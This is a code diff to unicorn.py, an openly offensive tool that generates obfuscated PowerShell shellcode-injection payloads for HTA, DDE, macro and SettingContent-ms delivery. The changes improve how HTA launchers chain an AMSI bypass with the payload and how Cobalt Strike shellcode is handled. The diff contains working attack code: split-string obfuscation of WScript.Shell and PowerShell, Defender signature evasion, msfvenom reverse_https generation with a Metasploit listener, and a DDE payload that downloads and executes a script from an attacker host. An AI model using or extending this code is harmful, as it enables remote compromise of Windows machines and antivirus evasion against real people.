@@ -216,7 +216,7 @@ def hta_help():
 
 The HTA attack will automatically generate two files, the first the index.html which tells the browser to
 use Launcher.hta which contains the malicious powershell injection code. All files are exported to the
-hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
+hta_attack/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
 last, the unicorn.rc (if metasploit was used) file. You can run msfconsole -r unicorn.rc to launch the listener 
 for Metasploit. If you didn't use Metasploit, only two files will be exported.
 
@@ -458,8 +458,8 @@ shellcode attacks.
 The four methods below on usage: 
 
 HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
-HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms
-HTA Example SettingContent-ms: python unicorn.py <path_to_shellcode.txt>: shellcode ms
+HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs> cs ms
+HTA Example SettingContent-ms: python unicorn.py <path_to_shellcode.txt> shellcode ms
 Generate .SettingContent-ms: python unicorn.py ms
 
 The first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth
@@ -487,15 +487,15 @@ Also check out: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/
 Usage: 
 
 python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
-python unicorn.py <cobalt_strike_file.cs cs ms
-python unicorn.py <path_to_shellcode.txt>: shellcode ms
+python unicorn.py <cobalt_strike_file.cs> cs ms
+python unicorn.py <path_to_shellcode.txt> shellcode ms
 python unicorn.py ms
 
 """)
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.17 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.18 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -511,8 +511,8 @@ def gen_usage():
     print("HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta")
     print("HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms")
     print("HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta")
-    print("HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms")
-    print("HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms")
+    print("HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs> cs ms")
+    print("HTA Example SettingContent-ms: python unicorn.py <path_to_shellcode.txt> shellcode ms")
     print("DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde")
     print("CRT Example: python unicorn.py <path_to_payload/exe_encode> crt")
     print("Custom PS1 Example: python unicorn.py <path to ps1 file>")
@@ -673,13 +673,18 @@ def gen_cert_attack(filename):
         print("[*] The second file, decode_command.bat will decode the cert to an executable.")
     else:
         print("[!] File was not found. Exiting the unicorn attack.")
-        sys.exit()
+        sys.exit(1)
 
 # Generate HTA launchers and index
 def gen_hta_attack(command):
     # HTA code here
 
-    command = command.replace("'", "\\'")
+    # when AMSI_BYPASS is on, the attack contains comment lines and multiple
+    # powershell commands separated by newlines. Raw newlines/comments inside
+    # the JScript string would break the HTA, so split them out and give each
+    # command its own run() call (AMSI bypass runs first, then the payload).
+    commands = [line for line in command.split("\n") if line.strip() and not line.lstrip().startswith("#")]
+
     # generate random variable names for vba
     hta_rand = generate_random_string(10, 30)
 
@@ -697,8 +702,12 @@ def gen_hta_attack(command):
     ps_split4 = generate_random_string(10, 100)
 
     main1 = ("""<script>\n{0} = "WS";\n{1} = "crip";\n{2} = "t.Sh";\n{3} = "ell";\n{4} = ({0} + {1} + {2} + {3});\n{6} = "pow";\n{7} = "ersh";\n{8} = "ell";\n{9} = ({6} + {7} + {8});\n{5}=new ActiveXObject({4});\n""".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, ps_split1, ps_split2, ps_split3, ps_split4))
-    main2 = ("""{0}.run(""".format(hta_rand))
-    main4 = ("""{0}', 0);window.close();\n</script>""".format(command)).replace("powershell", "{0} + '".format(ps_split4)).replace(";{0}".format(ps_split4), ";' + {0}".format(ps_split4))
+    main2 = ""
+    for attack_command in commands:
+        attack_command = attack_command.replace("'", "\\'")
+        attack_command = attack_command.replace("powershell", "{0} + '".format(ps_split4)).replace(";{0}".format(ps_split4), ";' + {0}".format(ps_split4))
+        main2 += """{0}.run({1}', 0);\n""".format(hta_rand, attack_command)
+    main2 += "window.close();\n</script>"
     html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>""")
 
     # remote old directory
@@ -713,7 +722,7 @@ def gen_hta_attack(command):
 
     # write out Launcher.hta
     print("[*] Writing malicious hta launcher hta_attack/Launcher.hta")
-    write_file("hta_attack/Launcher.hta", main1 + main2 + main4)
+    write_file("hta_attack/Launcher.hta", main1 + main2)
 
 
 # format metasploit shellcode
@@ -727,7 +736,7 @@ def format_metasploit(data):
         print("[!] Example: msfvenom -p LHOST=192.168.5.5 LPORT=443 -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -f c")
         print("[!] Also ensure your syntax for unicorn is correct. Missing IP address, port, etc. etc. will cause this error.")
         print("Exiting....")
-        sys.exit()
+        sys.exit(1)
 
     return data
 
@@ -784,16 +793,37 @@ def generate_shellcode(payload, ipaddr, port):
         #uri_length=generate_random_number(5,7)
         proc = subprocess.Popen("msfvenom -p {0} {1} {2} -t 0 --platform windows -f c".format(payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         # AutoUnhookProcess=true AutoVerifySession=false AutoLoadStdapi=false  AutoSystemInfo=false --smallest
-        data = proc.communicate()[0]
+        data, stderr_data = proc.communicate()
+        if proc.returncode != 0:
+            print("[!] msfvenom failed to generate shellcode (exit code {0}). Ensure Metasploit is installed, in your PATH, and your payload options are correct.".format(proc.returncode))
+            if stderr_data:
+                print(stderr_data.decode("utf-8", "replace").strip())
+            sys.exit(1)
         # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
         data = data.decode("ascii").replace('"\\xfc', '"', 1)
         # bug output for metasploit, going to check here - if present then throw error message to end user
         if "no longer be in use" in data or "long,erbe,inus,e,so,tryd,elet,ingt" in data:
             print("[!] There was a problem generating the shellcode due to a Metasploit error. Please update Metasploit and re-run this.")
-            sys.exit()
+            sys.exit(1)
 
     # return the metasploit data
     return format_metasploit(data)
+
+# chunk continuous 0xNN shellcode (e.g. 0xfc0xe8) into comma separated
+# 0xfc,0xe8 format expected by the powershell payload
+def chunk_shellcode(shellcode):
+    counter = 0
+    floater = ""
+    newdata = ""
+    for line in shellcode:
+        floater += line
+        counter += 1
+        if counter == 4:
+            newdata = newdata + floater + ","
+            floater = ""
+            counter = 0
+
+    return newdata[:-1]
 
 # generate shellcode attack and replace hex
 def gen_shellcode_attack(payload, ipaddr, port):
@@ -803,22 +833,8 @@ def gen_shellcode_attack(payload, ipaddr, port):
         shellcode = generate_shellcode(payload, ipaddr, port).rstrip()
         # sub in \x for 0x
         shellcode = re.sub("\\\\x", "0x", shellcode)
-        # base counter
-        counter = 0
-        # count every four characters then trigger floater and write out data
-        floater = ""
-        # ultimate string
-        newdata = ""
-        for line in shellcode:
-            floater += line
-            counter += 1
-            if counter == 4:
-                newdata = newdata + floater + ","
-                floater = ""
-                counter = 0
-
         # here's our shellcode prepped and ready to go
-        shellcode = newdata[:-1]
+        shellcode = chunk_shellcode(shellcode)
 
         # if we aren't using download/exec
         if not "url=" in ipaddr:
@@ -826,7 +842,13 @@ def gen_shellcode_attack(payload, ipaddr, port):
             write_file("unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(payload, ipaddr, port))
 
     # switch variable to be shellcode for formatting
-    if ipaddr == "cobaltstrike": shellcode = payload
+    if ipaddr == "cobaltstrike":
+        shellcode = payload
+        # normalize metasploit-style shellcode (\xfc continuous hex) the same way
+        # as the metasploit path - without this the payload cannot split the bytes
+        shellcode = re.sub("\\\\x", "0x", shellcode)
+        if "," not in shellcode:
+            shellcode = chunk_shellcode(shellcode)
 
     # added random vars before and after to change strings
     # this is a hack job but it works in checking to see if there are any variable name conflicts. While random, can happen when using only 2 randomized characters for char lenght. 
@@ -1097,7 +1119,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             # add HTA option for shellcode
             if "hta" in sys.argv:
                 gen_hta_attack(full_attack)
-                print("[*] Exported the custom shellcode to the hta generation under the hta_attacks folder. Enjoy!|n")
+                print("[*] Exported the custom shellcode to the hta generation under the hta_attacks folder. Enjoy!\n")
             if "macro" in sys.argv:
                 macro_gen = generate_macro(full_attack)
                 write_file("powershell_attack.txt", macro_gen)
@@ -1145,7 +1167,11 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
             # format for dde specific payload
             if attack_modifier == "dde":
-                full_attack_download = full_attack[11:] # remove powershell + 1 space
+                # download.ps1 is executed through IEX on the victim, so it needs the full
+                # powershell command line(s). Stripping the first 11 characters only worked
+                # before the AMSI bypass prepended comment/command lines - it now corrupts
+                # the first line of the script.
+                full_attack_download = full_attack
                 # incorporated technique here -> http://staaldraad.github.io/2017/10/23/msword-field-codes/
                 full_attack = ('''DDE "C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://%s/download.ps1'); # " "Microsoft Document Security Add-On"''' % (ipaddr)) # quote = WindowsPowerShell, powershell.exe, and iex
                 with open ("download.ps1", "w") as fh: fh.write(full_attack_download)
@@ -1332,7 +1358,7 @@ try:
     elif attack_type == "cs" or attack_type == "shellcode": 
         if not os.path.isfile(sys.argv[1]): 
             print("[!] File not found. Check the path and try again.")
-            sys.exit()
+            sys.exit(1)
         payload = open(sys.argv[1], "r").read()
 
         if not "," in payload:
@@ -1345,7 +1371,7 @@ try:
             if not "byte[] buf = new byte" in payload:
                 if not " byte buf[]" in payload:
                     print("[!] Cobalt Strike file either not formatted properly or not the C#/CS format.")
-                    sys.exit()
+                    sys.exit(1)
 
             payload = payload.split("{")[1].replace(" };", "").replace(" ", "") # stripping out so we have 0x00 format
 
@@ -1377,7 +1403,7 @@ try:
         # prevent usage of 'ps' and 'option', causing the app to crash
         else:
             print("[!] Something went way wrong while generating payload.")
-            sys.exit()
+            sys.exit(1)
 
         format_payload(ps, attack_type, attack_modifier, option)
 
@@ -1394,7 +1420,7 @@ try:
 
         else:
             print("[!] Options not understood or missing. Use --help switch for assistance.")
-            sys.exit()
+            sys.exit(1)
 
     elif len(sys.argv) == 2:
         if attack_type == "custom_ps1":
@@ -1407,7 +1433,7 @@ try:
 
         else:
             print("[!] Options not understood or missing. Use --help switch for assistance.")
-            sys.exit()
+            sys.exit(1)
 
     # if we did supply parameters
     elif len(sys.argv) < 2:
